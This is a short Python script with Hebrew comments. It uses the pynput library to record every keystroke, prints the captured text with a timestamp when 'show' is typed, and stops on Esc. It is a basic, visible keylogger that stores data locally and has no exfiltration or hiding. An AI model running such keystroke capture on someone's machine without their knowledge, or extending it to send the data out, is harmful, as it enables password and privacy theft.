#פונקציה שלוכדת מקשים
from pynput.keyboard import Listener, Key
# פונקציה של זמן
from datetime import datetime
#פונקציה לשמירה
# import threading

# משתנה לשמירת המקשים שנלחצו
keystring = []
#משתנה זמני לבדיקת 'show'
list_show = []
# פונקציית שמירה
def show_keys():
    if keystring:
        #מדפיס שעה ותאריך
        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]")
        #מדפיס מחרוזת רציפה מכל התווים שנשמרו
        print(''.join(keystring))
    else:
        print("\nלא נלחצו מקשים עדיין.")
    # # קריאה חוזרת כל כמות שניות
    # threading.Timer(3, report).start()

# פונקציית האזנה למקשים
def on_press(key):
    try:
        # ברגע שנלחץ Esc האזנה תפסיק
        if key == Key.esc:
            print("Esc was pressed — exiting...")
            return False
        else:
            char = key.char
            if char is not None:
                keystring.append(char)
                list_show.append(char)
                #שמירת 4 תווים אחרונים
                if len(list_show) > 4:
                    list_show.pop(0)
                #בדיקה אם הוקלד 'show'
                if ''.join(list_show).lower() == 'show':
                    show_keys()
                    list_show.clear()
            else:
                keystring.append('[unknown]')
    except AttributeError:
        text = str(key)
        if text.startswith('key.'):
            keystring.append(f'[{text[4:]}]')
        else:
            keystring.append(text)
        list_show.clear()

# # התחלת ההדפסה המחזורית
# report()

# התחלת האזנה
with Listener(on_press=on_press) as listener:
    listener.join()

print('אהלן אהלן')
